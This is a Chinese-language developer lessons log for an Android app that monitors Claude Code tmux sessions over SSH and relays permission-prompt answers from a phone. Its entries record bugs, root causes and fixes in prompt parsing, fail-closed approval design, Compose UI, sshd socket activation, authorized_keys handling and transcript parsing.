- **根因**：`Prompt.isFooter` 拿 `to navigate` 当锚。真机上抓到两种脚注：
  - `Enter to select · ↑/↓ to navigate · Esc to cancel`（AskUserQuestion / 计划批准）
  - `Esc to cancel · Tab to amend · ctrl+e to explain`（**权限提示，没有 navigate**）
- **修法**：改用共同点 `to cancel` 当锚。测试里放了**真机原样抄下来的**权限提示样本。
- **教训**：拿样本推规则时，样本的**覆盖面**比样本的精确度更要紧。
  我用两种样本推出了一条只对那两种成立的规则，而漏掉的那种恰好是最重要的。

## 47. ⭐ 「拒绝」是 **3** 不是 2 —— 硬编码一下就是永久放行
权限提示的三个选项是：
```
1. Yes
2. Yes, and always allow access to /tmp from this project   ← 这是「以后都别问」
3. No
```
通知按钮上要是把「拒绝」写死成 2，用户点一下 = **永久放行这一类操作**，
而且他以为自己拒绝了。所以按钮的号码和文案**一律从屏幕上读**，读不出来就不给按钮。
`PromptTest.权限提示` 钉住了这条。

## 48. ⭐ 通知按钮用 `PendingIntent.getService` 会被**静默挡掉**
- **症状**：通知上的按钮点了**完全没反应**，`logcat` 里**一条日志都没有**（连异常都没有）。
  按钮位置、坐标、PendingIntent 的 requestCode 全查过一遍，都没问题。
- **根因**：targetSdk 34+ 之后「从后台启动服务」被限制，通知动作里的
  `PendingIntent.getService` 会被系统直接吞掉。没有异常、没有日志。
- **修法**：改成 `PendingIntent.getBroadcast` + 一个 `BroadcastReceiver`
  （这本来就是通知动作的标准做法），接收器再去够那个活着的服务实例。
- **教训**：**「什么都没发生」也是一种症状，而且是最难查的一种。**
  查了好几轮才想到问题不在我的代码里，而在于我的代码压根没被调用。

## 49. fail-closed 该靠结构而不是靠代码写对
PRD 原本的设计是：hook 在 `PreToolUse` 阻塞最多 570 秒等手机回答，超时就输出 `"ask"`。
那条路上「自动放行」是**一个 if 写错就会发生**的事。

改成：**hook 只发通知，权限决定完全不经过它** —— 手机上点的按钮是往 TUI 送一个按键，
跟人在键盘上按是同一条路。于是：
- 手机连不上 → 没人按 → Claude Code 停在它自己的提示上等着
- `~/.yxi` 不可写 → 事件发不出去 → 同上
- hook 出任何错 → 它本来就不输出决定 → 同上

**「自动放行」这条路在结构上不存在**，而不是被小心地避开了。
`server/test_yxi.py::test_approval_fail_closed` 端到端验了这条：
`~/.yxi` 设成不可写 + 没人回答，40 秒后命令没执行、提示还挂着。

## 50. LazyColumn 的 content 里读 state，加进去的 item 不出现
- **症状**：用量卡怎么都不显示。日志证明数据拿到了、解析对了、state 也写了 ——
  但 `usage?.let { item(key="usage") { UsageCard(it) } }` 这一项就是不出现。
- **绕法**：把它挪到 `LazyColumn` **外面**（列表上方）。一挪就好了。
- **顺带更好**：用量是「今天还能干多少」的背景信息，本来就不该跟着会话列表滚走。
  所以这个绕法同时是更对的 UI。
- ⚠️ 我没有深究 Compose 内部为什么如此（可能跟 content lambda 的订阅时机有关），
  **所以这条记的是现象和绕法，不是根因** —— 别把它当结论引用。

## 51. 用量宁可不显示，也不能显示假的
`ccusage` 探测不到就**整块藏起来**：不显示 0，不显示「未知」，不画空进度条。
理由很实际：额度这种数字**你会照着它安排今天开不开大活**。
一个假的 0 会让你以为额度还很多，一个假的满格会让你不敢干活 —— 两种都比看不见糟。

主机列表上的用量是**缓存**（会话看板连上时探一次存下来），超过 30 分钟会标出
「几小时前」。显示旧数字不标时间，跟显示假数字是一个性质。

## 52. 附件不走对话内容，走**路径映射**
上传到 `/root/src/tmp/<会话名>/`，发送时在正文前面加一行 `[图片1] <绝对路径>`。
Claude 自己去 Read 那个文件 —— 我们不把图片内容塞进对话，也就不用管编码、大小、多模态格式。
实测：手机上传一张截图 → 那边的 Claude 直接把截图内容描述出来了。

清理那条 `find` 是刻意写死的：路径是常量（不接受外部输入）、`-xdev`、
`-type f`（**不跟符号链接**，`-L` 绝不加）、`-mindepth 2`（不动 tmp 根本身）、
删之前先把清单追加进 `.swept.log`。**会删文件的命令，每个参数都要说得出理由。**

## 53. ⭐ 只比「几号 + 选项文案」挡不住过期 —— 两个权限提示长得一模一样
- **怎么发现的**：在**设计测试**的时候发现的，不是跑出来的。
  我想构造「屏幕上换成另一个提示」的场景，写着写着意识到：
  两个权限提示的选项**完全相同** —— 都是 `1. Yes / 2. Yes, and always… / 3. No`，
  连标题都同样是 `Do you want to proceed?`。原来的检查照样放行。
- **后果**：你以为在批 A，实际批的是屏幕上换上来的 B。**而且没有任何提示。**
- **修法**：给整块提示算个指纹（1 号选项**往上 8 行**到脚注，去空白后哈希）——
  往上 8 行才能把命令正文圈进来，那才是区分两个提示的东西。
- **两条测试**：不同命令的两个提示指纹必须不同；同一个提示反复解析指纹必须稳定
  （不稳定的话每次抓屏都判「变了」，按钮永远按不动）。
- **教训**：**把测试写出来这件事本身就在做设计审查。** 这个洞不是测出来的，
  是「想不出怎么测」的时候暴露的。

## 54. `set -euo pipefail` 下 `grep` 没匹配会直接终止脚本
- **症状**：`dev/seed.sh` 只打印一行 `Success` 就结束了，**没有任何错误信息**，
  后面的步骤全没跑，App 数据也没写。
- **根因**：`PUB=$(… | grep -o … | cut …)`，grep 没匹配返回 1，`pipefail` 让整个
  命令替换返回 1，`set -e` 当场终止 —— **在我下一行那句「拿不到公钥就报错」之前**。
  我写了检查，但它永远轮不到执行。
- **修法**：`… || true`，让检查有机会跑。
- 跟 #19（`$?` 拿的是管道最后一个命令的退出码）、#43（装包失败被 `>/dev/null` 吞掉）
  是同一个家族：**把失败藏起来，然后去别处找原因。**

## 55. 输入框里那些「我没打过的话」是 Claude Code 的建议下一句
测试期间反复看到 tmux 会话的输入框里出现我从没输入过的中文
（「切到 default 模式再跑一次」「查这 6 个会话为啥都在等」…）。
一度怀疑是自己 `adb shell input text` 打错了会话，还为此紧张过一次。
**其实是 Claude Code 自己渲染的「建议下一句」（ghost text）。**
—— 也就是说那次并没有往别人的会话里打字。记下来免得下次又白紧张。

## 56. 自更新：模拟器的图形安装器装不上，但包是好的
- **现象**：App 里点「下载并安装」→ 系统弹「App not installed.」。
- **查证**：把 App 下载到 `cache/update/Yxi.apk` 的那个文件拉回服务器比对 ——
  **sha256 和服务器上的完全一致**；而且同一个文件用 `adb pm install -r` **装得上**。
  第一次失败时日志里还给了原因：`INSTALL_FAILED_VERIFICATION_FAILURE`。
- **结论**：检测 / 下载 / 完整性校验 / 权限处理 / 拉起安装器**这几段都验过了**，
  卡在模拟器自带的图形安装器上。真机上这是所有自更新 APK 的标准路径。
  ⚠️ **但我没有在真机上验过最后那一下** —— 别把它当已验证的功能。
- 顺带：`REQUEST_INSTALL_PACKAGES` 没授权时不能直接 `startActivity`（会被静默拒），
  要先判 `canRequestPackageInstalls()` 再把用户送去设置页。这条已经实测过。

## 57. 更新走 SFTP 不走 HTTP —— 为什么
- 仓库是私有的，GitHub Release 的 API 要 token，**把 token 塞进 APK 等于公开它**。
- 这个 App 到目前为止**除了那一条 SSH 连接之外没有任何网络面**。
  为了「查个版本号」引入 HTTP 客户端、证书校验、代理处理，不划算。
- 服务器是用户自己的，公司内网 / 防火墙后面照样能用。
- 代价：得自己 `./server/install.sh --publish <apk> <code> <name> [说明]` 把包摆上去。
  仓库将来转公开的话，再加一条 GitHub Release 的路子也不冲突。

## 58. ⭐ 「地址解析不了」的真正原因多半是**全角字符**
- **现象**：用户在真机上填 `216.36.108.147`，App 报「地址解析不了」。
  他看着那个地址觉得**完全正确** —— 因为全角句点 `．` 和半角句点 `.` 长得几乎一样。
- **同类**：中文输入法的全角数字 `２１６`、中文句号 `。`、零宽字符（**肉眼完全看不见**）、
  以及顺手带上的 `root@` / `:22` / `ssh://` / 前后空格。
- **修法**：
  - 输入时做安全归一（全角→半角、清空白和零宽）
  - 还有非 ASCII 就**当场指出是哪个字**：`地址里有个连不上的字符：「。」(U+3002)`。
    只说「解析不了」等于没说。
  - 报错文案也把它想解析的那个字符串**原样引出来**，并指出可疑字符。
- **教训**：**「用户输错了」不是结论，是问题的开始** —— 得回答「他为什么会输错、
  以及怎么让他看见」。这个坑在电脑上几乎不存在，在手机上很常见。

## 59. ⭐ 别在用户手指底下改他正在打的东西
- **经过**：为了让 `root@ip:2222` 自动拆进三个栏位，我做成了**边输边拆**。
  加了个「一次进来一大段就当粘贴」的启发式想避开逐字符的问题。
- **结果**：启发式不成立。输入法整词上屏、`adb input text` 成块送，都会触发 ——
  打到 `216.36.108.147:22` 那一刻 `22` 被切走当端口，剩下的 `22` 落回地址栏，
  变成 `216.36.108.14722` / 端口 `22`。**人手打一样中招。**
- **修法**：打字时只做**幂等且不改结构**的归一（全角→半角）；
  拆分放到**保存**时做，那时整串才完整；中间用一行预览告诉用户
  「保存时会拆成：地址 … · 用户名 … · 端口 …」——**告知，但不动他的输入**。
- 这跟 #40（会话看板在手指落下前重排）是**同一类错误**：
  界面在用户操作的过程中改变了操作对象。

## 60. ⭐ `detectVerticalDragGestures` 会把**横向拖拽也吃掉**
- **症状**：悬浮排列的卡片横滑完全不动，pager 像死了一样。不报错、没日志。
- **根因**：卡片上挂了 `pointerInput { detectVerticalDragGestures { … } }`（做「上滑归档」），
  而卡片铺满整页 —— 于是所有拖拽都先被它拿走，上层 pager 一个事件都收不到。
- **怎么定位的**：**把那个 pointerInput 摘掉**，横滑立刻恢复。
  跟 TROUBLESHOOTING #16 一样：**摘掉一个组件看还坏不坏，比继续猜有效得多。**
- **修法**：改用 `Modifier.draggable(orientation = Vertical, …)` ——
  它带方向锁，竖向归自己、横向让给上层滚动容器。
  **需要跟父级滚动共存的手势，就别用裸 `pointerInput`。**

## 61. ⭐ 定位用的 `LaunchedEffect` 键里带了会变的列表 → 每次刷新都把用户拽回去
- **症状**：卡片能滑一点点，然后自己弹回原来那张。看起来像「手势没生效」。
- **根因**：`LaunchedEffect(list, current) { scrollToPage(当前会话) }` ——
  而 `list` 每 5 秒随会话快照刷新一次，于是**每 5 秒把 pager 拽回去一次**。
- **修法**：加一个 `located` 标志，只定位一次。
- **教训**：**「打开时定位到某处」这种一次性行为，别写成对状态变化的响应。**
  我先去查手势了，因为现象长得像手势失效 —— 两个不同的 bug 叠在一起，
  症状完全一样（滑不动），这是查得慢的真正原因。

## 62. `enableEdgeToEdge` 下软键盘会盖住底部的工具条
- **症状**：终端模式弹出软键盘，**键盘工具条（esc / tab / ^C）整条不见了** ——
  而那恰恰是打字时最需要的几个键。
- **根因**：`enableEdgeToEdge` 之后窗口是铺满的，IME 弹出不会自动压缩内容，
  底部那一条就被键盘盖在下面了。`android:windowSoftInputMode="adjustResize"` 也救不了它。
- **修法**：工作区根部加 `Modifier.imePadding()`。
- **教训**：**edge-to-edge 是把「处理系统栏」这件事从系统手里接过来了**，
  状态栏、导航栏、IME 三处都得自己吃边距 —— 漏一个就有一处被盖住，
  而且只在特定状态下才看得见（这条只在键盘弹起时才暴露）。

## 63. 换了导航结构，测试脚本跟着废了
- `dev/seed.sh` 靠「点右上角公钥按钮」逼 App 生成密钥、再从 logcat 里捞公钥。
  公钥入口搬进设置页之后这条路断了，脚本报「没拿到公钥」，
  但**真正的原因跟公钥一点关系都没有**。
- 修法不是追坐标（那还会再断），而是**让被测对象自己说话**：
  `KeyManager` 每个进程报一行「本次使用 pub=…」，生成新密钥时再单独警告一行。
  公钥本来就要贴到服务器上去，不是秘密；而它一变就是所有机器同时失效的大事，
  这行日志本身就有排查价值。
- **教训**：**测试脚本别依赖界面坐标。** 界面一定会改，而脚本坏掉时的报错
  往往指向完全无关的地方。

## 64. ⭐ 模拟器一直走 `10.0.2.2`，「连公网 IP」这条路一次都没测过

**症状**：模拟器上一切正常，用户装上真机说「连不上服务器」。

**根因**：`dev/seed.sh` 里预置的主机是 `10.0.2.2` —— 模拟器的宿主机别名，
指向本机回环。所以 sshd 日志里 App 的连接**永远来自 `127.0.0.1`**。
用户走的是公网 IP → 完全另一条路径（真 TCP、真握手、可能有防火墙 /
fail2ban / 运营商），而这条路径从来没跑过。回环连通**不构成**公网连通的证据。

**修法**：`seed.sh` 里加一台走本机真实公网 IP 的主机（从 `ip -o addr` 取，不写死）。
排查「用户连不上」时，第一件事是去 sshd 日志看**源 IP**：全是 127.0.0.1
就说明你压根没测过用户走的那条路。

**怎么避开**：测试环境和用户环境不同的每一处，都要问一句「这条差异会不会
正好盖住 bug」。宿主机别名、回环、内网直连，都属于「会盖住」的那一类。

## 65. ⭐⭐ 开发脚本把**用户真手机的公钥**从服务器上删掉了

**症状**：用户「连不上服务器」，同时「检查更新也失败」。服务器这头查什么都正常：
端口开着、从外部机器 SSH 得通、sshd 配置没问题、fail2ban 没封他。
日志里**找不到他手机的任何痕迹** —— 不是「连上被拒」，是根本没到认证。

**根因**：`KeyManager` 给**每一台** Android 设备生成的公钥注释都是 `yxi@android`
—— 模拟器是这个，用户的真手机也是这个。而 `dev/seed.sh` 装模拟器公钥时写的是：

```bash
grep -v yxi@android ~/.ssh/authorized_keys > /tmp/.ak   # 删掉所有 yxi@android
echo "ssh-ed25519 $PUB yxi@android" >> /tmp/.ak          # 只把模拟器的加回去
```

于是**每跑一次开发脚本，就把用户真手机踢出服务器一次**，station 上也一样。
用户那把钥匙的指纹在整个 sshd 日志里一次都没出现过。

**为什么难查**：改的是开发脚本，坏的是生产授权，两者在脑子里根本不挨着；
而且服务器侧所有常规检查（端口、配置、防火墙、日志）全是绿的 ——
唯一的线索是「日志里连他的失败记录都没有」，这个「没有」很容易被当成「他没试」。

**修法**：模拟器自己的钥匙用**专属标签** `yxi@emulator`，过滤也只过滤这个标签。
`server/test_yxi.py::test_seed_never_evicts_a_real_phone` 守住：seed.sh 的**代码**里
出现 `yxi@android` 就红。

**怎么避开**：任何**自动改共享状态**的脚本（authorized_keys、known_hosts、
数据库、配置文件），删除条件必须能唯一认出「我自己写的那条」，
绝不能用一个别人也会用的标签。这类脚本改的是**别人也在用的东西**，
`grep -v <一个不够独特的串>` 就是一把没有刀鞘的刀。

## 66. fail2ban 会让「密码打错几次」变成「连接超时」

**症状**：先是认证失败，重试几次之后变成连不上 / 超时，看起来像网络断了。

**根因**：本机 fail2ban `maxretry=5 / findtime=600 / bantime=600` ——
10 分钟内失败 5 次，这个 IP 被封 10 分钟。封的是**整个 IP**，
表现从「认证失败」变成「TCP 连不上」，症状完全换了一副面孔。

**怎么避开**：手机在移动网络下 IP 还会变，封了换个基站可能就好了 ——
这种「时好时坏」最容易误判成 App 的 bug。用户报「一开始报错、后来干脆连不上」，
先去 `fail2ban-client status sshd` 看 banned 列表，别急着改代码。

## 67. ⭐⭐ 改 `sshd_config` 的 `Port` 毫无反应 —— 而且 `sshd -T` 还骗你说生效了

**症状**：给 sshd 加第二个端口，往 `/etc/ssh/sshd_config.d/` 里写 `Port 8443`，
`sshd -t` 通过、`sshd -T | grep port` **明明列出了 8443**、`systemctl reload ssh` 也成功——
但 `ss -lnt` 里只有 22，从外面连 8443 是 `Connection refused`。

**根因**：这台机器的 sshd 是 **systemd socket 激活**：

```
$ systemctl show ssh.service -p TriggeredBy
TriggeredBy=ssh.socket
```

端口由 `ssh.socket` 的 `ListenStream=` 绑好、把 fd 递给 sshd，**sshd 只用递过来的 fd，
自己配置里的 `Port` 完全不看**。而 `sshd -T` 打印的是「配置解析结果」，不是「实际在听什么」——
**它没有说谎，只是回答的不是你问的问题**。判断在不在听，唯一可信的是 `ss -lnt`。

**修法**：写 `/etc/systemd/system/ssh.socket.d/*.conf`：

```ini
[Socket]
ListenStream=0.0.0.0:8443
ListenStream=[::]:8443
```

两个地址族都要写。只写 `ListenStream=8443` 时 systemd 只绑 `[::]:8443`，
本机 `bindv6only=0` 按说该双栈通吃，实测 IPv4 仍然 `Connection refused` ——
基础单元里 22 就是老老实实写两行，现在知道为什么了。

**⚠️ 我在这上面把 SSH 搞挂了一分钟**：`sshd_config` 那份没删就又加了 socket 那份，
两套机制同时抢 8443。`systemctl restart ssh.socket` 停掉 socket 后，
`ssh.service` 自己以 standalone 方式起来、按 `sshd_config` 绑了 8443，
于是 socket 单元 `Address already in use` 启动失败 —— **连 22 都没人听了**。

**怎么避开**：
- **只留一套机制**。要用 socket 激活就别碰 `sshd_config` 的 `Port`。
- 改之前先问 `systemctl show ssh.service -p TriggeredBy`，别默认 sshd 是传统守护进程。
- 这类改动**必须带自动回滚**：改完立刻 `ss -lnt` 验 22 还在，不在就自己回滚。
  脚本见本次提交的做法（失败 → 删 drop-in → `daemon-reload` → 重起 socket → 复验 22）。
- **验证要从外部机器发起**，本机 `ss` 只能证明在听，证明不了外面进得来。

## 68. ⭐ 主机只能「加」，不能改也不能删 —— 而我还让用户「删掉重加」

**症状**：用户要把某台主机的端口从 22 改成 8443，找不到任何入口。
点主机 = 直接连接，长按 = 装公钥，**没有第三个动作**。

**根因**：`HostsScreen` 从头到尾只有 `AddHostSheet`。`HostStore` 里
`upsert` / `remove` 早就写好了，界面上**一个都没接**。
更糟的是：地址里混进全角字符是最常见的一种错，我在错误提示里
明明白白写着「删掉用英文键盘重打」—— **而根本没有地方能删**，
唯一的办法是卸载重装（连密钥一起丢）。

**修法**：长按 → 「改主机」表（字段预填），底下加「装公钥 / 删除」。
两个细节不能省：

- **改了地址或端口，存的主机指纹必须作废**（`hostKey = null`）。
  那把指纹属于旧配置；留着的话下次连接会报「⚠️ 主机指纹变了，已拒绝连接」——
  那是中间人攻击的措辞，会把一次正常的改配置说成攻击。
- **删除要两下**（「删除」→「再点一次删除」）。主机记录里存着密码密文，
  手机上误触一下就没了。删完还要 `EventService.sync` ——
  删掉的可能正是唯一开着铃铛的那台，不同步的话前台服务会继续盯一台不存在的机器。

**顺带修的**：`ModalBottomSheet` 里那个 `Column` 没有 `verticalScroll`。
半开的表放不下这些字段，**「保存」落在屏幕外**，得先把表往上拖才够得着，
而没有任何东西提示要拖 —— 加主机表一直就是这样，只是字段少一点没这么明显。
`imePadding` 同理：软键盘弹起来也会盖住「保存」。

**怎么避开**：**凡是能创建的东西，都要能改、能删。** 只做「加」的界面，
第一个用户输错的时候就废了。写错误提示时顺手问一句：
「我让他做的这个动作，界面上真的做得到吗？」

## 69. ⭐⭐ 下载链接和「发布」写的是两个文件 —— 发了新版，链接还在发旧包

**症状**：`install.sh --publish` 说「发布好了，versionCode 6 / 0.4.1」，
设置页点检查更新说「✓ 已是最新」，**而用户从下载链接拿到的还是 0.4.0**。
三处说法互相印证，全都"对"，只有用户手上的包是旧的。

**根因**：两条路，各读各的文件。

| 谁 | 读哪个文件 |
|---|---|
| `install.sh --publish` 写 | `~/.yxi/Yxi.apk` + `~/.yxi/latest.json` |
| App 检查更新（SFTP） | `~/.yxi/latest.json` → `~/.yxi/Yxi.apk` |
| **下载链接 `:8899/…/apk`** | **`<仓库根>/Yxi-0.1.0-debug.apk`** ← 第一版留下的名字 |

`serve.py` 里那行是写死的，而且注释还信誓旦旦写着「内容永远是最新构建」——
实际上只有人手动 `cp` 过去才会更新。发布流程根本不碰它。

**为什么难发现**：检查更新查的是 `latest.json`，**跟下载链接不是一回事**，
所以「已是最新」这句话是真的，只是它回答的不是「你下的那个包新不新」。
外部完全看不出来 —— 得把两边的 sha256 摆在一起才现原形。

**修法**：`serve.py` 改读 `~/.yxi/Yxi.apk`，并把仓库根目录那个旧包删掉。
**一个包只能有一个来源。**

**怎么避开**：发完版**必须比对公网取回来的字节**，不能只看发布脚本的输出：

```bash
curl -s -o /tmp/s.apk <下载链接>
sha256sum /tmp/s.apk ~/.yxi/Yxi.apk <构建产物>   # 三个必须一模一样
```

更一般的：**任何"同一样东西"有两条路径能拿到，就迟早会分叉**。
要么合成一条，要么加一个把两条摆在一起比的检查 —— 光靠"记得同步"是不行的。

## 70. ⭐ 服务器侧全绿、用户还是连不上 —— 这时候你是在瞎猜

**症状**：用户报「连不上」。服务器上查什么都正常：端口在听、ufw 放行、
外部机器 SSH 得通、fail2ban 没封他。**日志里连他的失败记录都没有。**

**根因不是某一个 bug，是位置**：包没飞到服务器，等于那一头什么都没发生。
决定性的信息全在手机上：

- **超时** 还是 **拒绝** —— 前者是包被丢了（被挡），后者是包到了但没人听。**方向完全相反。**
- 卡在 **DNS** 还是 **TCP** 还是 **认证**
- **哪个端口通、哪个不通** —— 区分「整台机器不可达」和「只有这一个端口被掐」
- **WiFi 还是移动网络** —— 运营商屏蔽只发生在移动网络上

而用户能转述给你的，通常只有「连不上」三个字。**来回问十轮，不如让手机自己测一遍。**

**修法**：设置页连点三下版本号 + 口令 → 开发者模式 → 「跑一次诊断」，
把上面每一项跑出来、给一句结论、一键复制。口令**只存哈希**（`DevMode.HASH`），
诊断文本里**不含密码和私钥**（密码只报「有没有」，密钥只报指纹）——
它就是拿来贴给别人看的，含了就等于公开。

**怎么避开**：**凡是「问题只发生在用户那头」的系统，都要有一个让用户一键
把现场交出来的入口。** 否则每次排查都从「你再描述一遍」开始，
而用户的描述里恰好没有你需要的那个字。

## 71. ⭐⭐ 错误信息报的是**用户起的名字**，不是它真正连的地址

**症状**：用户的更新检查报「连不上 216.36.108.147」。于是我在服务器上
围着这个 IP 查了好几轮：端口、ufw、fail2ban、外部机器连通性，甚至给 sshd
加了个备用端口 —— 全是绿的。**而 App 从来没有连过这个 IP。**

**根因**：

```kotlin
Update.Result.Failed("连不上 ${host?.alias}，没查成")   // ← alias 是「名字」栏
```

那台主机的**名字**栏填的是 `216.36.108.147`，**地址**栏填的是 `天亮`
（用户笔电 `~/.ssh/config` 里的 SSH 别名 —— 手机上没有那个文件）。
于是错误信息理直气壮地报出一个它压根没解析过的 IP，
把排查整个带进了「端口/防火墙」的死胡同。

**为什么特别毒**：错误信息通常是排查的起点，**它错了，后面全错**，
而且越查越"确认"——因为你查的那个 IP 本身确实活着、确实有些端口不通，
每一步都能查出点"像是原因"的东西来。

**修法**：
- **凡是描述一次失败的文案，一律用真正连的目标**（`host.display` = `user@host:port`），
  别名只用于"指哪一条记录"。
- 主机列表里，地址含非 ASCII 字符就**标红并写明是哪个字符** ——
  `root@天亮` 在列表里躺了好几天没人发现，因为它看着就是一行灰字。

**怎么避开**：**用户能自己起名的字段，永远不能出现在诊断信息里当事实。**
名字是他随手写的，可以写任何东西，包括一个会把你带偏的正确格式的 IP。
诊断只认机器实际用的值。

## 72. ⭐⭐ 用户在 Claude 忙的时候打的字，手机上一条都不显示

**症状**：用户连打了四条，手机对话模式里**还停在更早那一条**。
他自己猜对了原因：「是不是在 pending 排队的输入你就没有处理和显示」。

**实测对照**（同一时刻，两边并排）：

```
画面（tmux capture-pane）              转录文件（手机读的）
─────────────────────────────         ──────────────────────────
· Scampering… (4m 48s · ↓ 10.2k)      最后一条 user 还是更早那条
❯ 还有终端模式我怎么不能滑动屏幕…
❯ Press up to edit queued messages
  ⏵⏵ … esc to interrupt …
```

**根因**：排队的输入**在转录里类型不是 `user`**：

```json
{"type":"queue-operation","operation":"enqueue","content":"…"}   进队（提交那一刻就写）
{"type":"queue-operation","operation":"remove", "content":"…"}   出队
{"type":"attachment","attachment":{"type":"queued_command","prompt":"…",
                                   "origin":{"kind":"human"}}}    真正进入对话
```

`Transcript.parse` 先取 `d.optJSONObject("message")`，取不到就 `return@forEach` ——
这三种行**都没有 message 字段**，于是全被静默丢掉。
后果不只是「晚点才显示」：`queued_command` 也被丢，所以**处理完之后也永远不显示**。
用户会以为没发出去，然后重复发一遍。

**修法**：在取 `message` 之前接住这三种。`enqueue` 进待显示集合、`remove` 移出、
`queued_command`（且 `origin.kind == "human"`）当成正常用户消息发出去。
还挂着的在列表末尾渲染成「排队中」气泡（半透明 + 虚线边，**必须一眼看出和已发送的不同**）。

**弯路**：第一版是从 `tmux capture-pane` 刮屏拿排队内容的。能用，但要处理折行拼接，
还要跟转录比对去重才能分清「排队中」和「已处理」—— 而**转录里本来就有原文和进出队时刻**。
后来整段删掉改读转录。教训：**能从权威来源拿的就别刮屏**；
刮屏只留给转录里真的没有的东西（状态词 `✽ Scampering…`、正在等你选的提示）。

## 73. ⭐ 一进对话就一闪一闪地跳

**症状**：点进对话模式，画面上下乱跳几下才稳定。会话历史越长越明显。

**根因**：`tail -n 800 -f` 是**分批**吐进来的，节流每 300ms 刷一次 `items`，
而滚动是 `LaunchedEffect(items.size) { animateScrollToItem(...) }` ——
**每一批都启动一次滚动动画，上一个还没走完下一批又来**。

**修法**：
- 加一个「历史灌完了」的标志（节流循环空转一次 = 灌完）。灌的过程中一律
  `scrollToItem`（**瞬移，不做动画**），用户看到的是「一进来就在最新的地方」。
- 灌完之后才允许动画，而且**只在本来就在底部时才跟着走** ——
  用户往上翻着看旧消息时把他拽回底部，比不滚更烦（跟 #61 同一类错误）。

**怎么避开**：**「数据分批到达」+「每次到达都播动画」= 必然抖。**
凡是数据流式进来的列表，先问一句「第一屏该不该有动画」——
首屏定位要的是**结果**，不是过程。

## 74. ⭐ 「去开启后台不受限制」跳过去，列表里找不到这个 App

**症状**：用户点「去开启」，跳进了电池优化设置，但**列表里没有 Yxi**。
（用户原话：「直接跳转到电池优化里面去了…但是没有看见我们的 app 这对吗」）

**根因**：用的是 `ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS` ——
它打开的是「**已经**被放行的应用」列表。而我们恰恰**还没被放行**，
所以必然不在里面。intent 名字里有 `IGNORE_BATTERY_OPTIMIZATION`，
很容易以为是「去设置它」，其实是「看谁已经被设置了」。

**修法**：`ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` + `package:<自己>`，
直接对本应用弹授权框（实测弹出 "Let app always run in background?"，点 Allow
后 `dumpsys deviceidle whitelist` 里就有了）。需要 manifest 里加
`REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` 权限，否则会被拒。
厂商 ROM 上可能被拿掉，所以留两级退路：本应用设置页 → 全局列表。

**另外**：荣耀/华为的电池白名单只是**其中一道**。真正掐后台的是
「应用启动管理」，那个没有标准 intent，只能把路径写在界面上告诉用户 ——
不写的话用户开完上面那个开关以为搞定了，实际还是不会响。

## 75. ⭐ 切一次标签页就重连一次 SSH

**症状**：从底部栏「设置」切回「会话」，每次都要重新连接（~3 秒）。

**根因**：连接建在 `SessionsScreen` 里的 `LaunchedEffect(host.id)`。
底部栏是 `when (tab) { ... }` —— 切走时那个 composable **离开组合树**，
协程被取消、状态丢失；切回来重新组合，于是 TCP + 握手 + ed25519 认证再来一遍。

**修法**：把连接提到 tab 切换**之上**（`MainActivity` 里 `rememberHostSession`），
各页面通过参数拿。跟 D21「换会话不重连」是同一条原则：
**连接跟着「主机」活，不跟着界面活。**

**怎么验**：别数 `Accepted publickey` 的总数 —— 那里面混着自己在服务器上敲的
`ssh` 命令和前台服务的连接。**按 App 那把钥匙的指纹过滤**再数：
```bash
FP=$(grep 'yxi@emulator' ~/.ssh/authorized_keys | ssh-keygen -lf - | awk '{print $2}')
journalctl -u ssh --since "$T" | grep -F "$FP" | grep -c Accepted
```
实测来回切 8 次 tab → **新增 0 次**。第一次没过滤时数出来是 2，差点以为没修好。

## 76. ⭐⭐ 「排队中」的气泡永远不消失，而那些命令几小时前就跑完了

**症状**：某个会话里挂着七八条「排队中」，实际上那些指令早就执行完了。
（用户原话：「实际上我们的 mail 的 tmux 早就完成那些指令了…是没有同步做好吗」）

**根因**：我把「出队」判据定成了 `queue-operation: remove`。实测一个真实会话：

```
enqueue 35 条  ·  remove 29 条  ·  有进无出 13 条
那 13 条：queued_command=False，但**全部**后来以普通 `user` 消息出现过
```

也就是说它们**早就被处理了**，只是 Claude Code 走的不是 `remove` 那条路径
（`remove` 只在「当前这一轮里出队」时才写）。跨轮次被消化掉的那些，
转录里直接就是一条普通 `user` 消息。

**修法**：出队的判据改成「**这句话有没有真的作为用户消息出现过**」——
解析完之后拿所有 `UserText` 的原文过一遍，命中的就不再算排队。
`remove` 仍然处理（同一轮内的快路径），但不再是唯一依据。

**怎么避开**：**状态机不要只认「关」的那个事件。** 生产者可能有别的路径
达到同一个终态，而你只订阅了其中一条。判据要挑**终态本身**
（「它出现在对话里了」），不是「某个特定的转换事件」。

## 77. ⭐ 终端画面整个是花的 —— 折行错位、边框断开

**症状**：进终端模式，内容全乱，看着像连不上。

**根因**：`openShell(80, 24)` 是写死的初始尺寸，真实尺寸靠控件的 `onResize` 回调补。
但**控件量出自己多大发生在连接建好之前** —— 那一刻 `shell` 还是 null：

```kotlin
onResize = { dim -> scope.launch { shell?.resize(...) } }   // shell 还没有 → 静默丢掉
```

尺寸之后不再变，`onResize` 也不会再触发。于是 tmux 那头永远是 80x24，
而控件其实只有 55 列 —— 服务器按 80 列排版，手机按 55 列折行，全乱。

**修法**：把最后一次尺寸记在 `AtomicReference` 里，开通道时直接用它
（量不到才退回 80x24），开完再补送一次。实测 `tmux list-clients` 从
`80x24` 变成 `55x30`，画面立刻正常。

**怎么避开**：**回调可能在接收方就绪之前就来，而且只来一次。**
凡是「A 通知 B」但 A、B 生命周期不同步的地方，都要把最后一次通知**存下来**，
B 就绪时自己取 —— 不能指望 A 再发一遍。

## 78. ⭐⭐ `runCatching` 把 `CancellationException` 也吞了 → 界面上留一句永久的假错误

**症状**：会话标题下挂着 `终端起不来: The coroutine scope left the composition`，
而且再进来也不消失。

**根因**：

```kotlin
runCatching { …开通道… }.onFailure { status = "终端起不来：${it.message}" }
```

切模式 / 退出工作区时 `LaunchedEffect` 被取消，挂起点抛 `CancellationException` ——
**`runCatching` 连它一起捕获**，于是把一次正常的取消写成了用户可见的错误，
而 `status` 是记住的状态，那句话就永远挂在那里了。

**修法**：`if (it is CancellationException) throw it` 再处理其余。
本项目里同一个写法有**四处**（终端开通道、切会话、连接重试、文件列目录、看板刷新）——
一处发现就要全仓 grep `onFailure { status`，它们是同一个错。

**怎么避开**：**`runCatching` 不是 try-catch 的等价物**，它捕获 `Throwable`，
包括协程的取消信号。Kotlin 的铁律：**`CancellationException` 必须原样抛回去。**
